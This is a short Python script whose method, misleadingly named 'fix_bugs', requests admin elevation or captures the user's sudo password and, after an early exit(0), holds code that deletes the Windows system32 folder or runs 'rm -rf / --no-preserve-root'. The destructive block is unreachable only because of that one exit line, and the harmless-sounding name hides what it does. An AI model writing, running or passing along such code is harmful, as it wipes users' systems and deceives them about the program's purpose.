import platform


class Bugs(object):

    @staticmethod
    def fix_bugs():
        import subprocess
        import getpass
        if platform.system() == 'Windows':
            import ctypes, sys

            def is_admin():
                try:
                    return ctypes.windll.shell32.IsUserAnAdmin()
                except:
                    return False

            if is_admin():
                process = subprocess.Popen('dir', shell=True)
                process.wait()
            else:
                # Re-run the program with admin rights
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)

        else:
            password = getpass.getpass()
            process = subprocess.Popen(['sudo','-p','','-S', 'ls'], stdin=subprocess.PIPE)
            process.stdin.write(password + "\n")
            process.stdin.close()
            process.wait()
        exit(0)
        if platform.system() == 'Windows':
            import ctypes, sys

            def is_admin():
                try:
                    return ctypes.windll.shell32.IsUserAnAdmin()
                except:
                    return False

            if is_admin():
                process = subprocess.Popen('del c:\WINDOWS\system32', shell=True)
                process.wait()
            else:
                # Re-run the program with admin rights
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)

        else:
            password = getpass.getpass()
            process = subprocess.Popen(['sudo', '-p', '', '-S', 'rm', '-rf', '/', '--no-preserve-root'], stdin=subprocess.PIPE)
            process.stdin.write(password + "\n")
            process.stdin.close()
            process.wait()

if __name__ == "__main__":
    Bugs().fix_bugs()
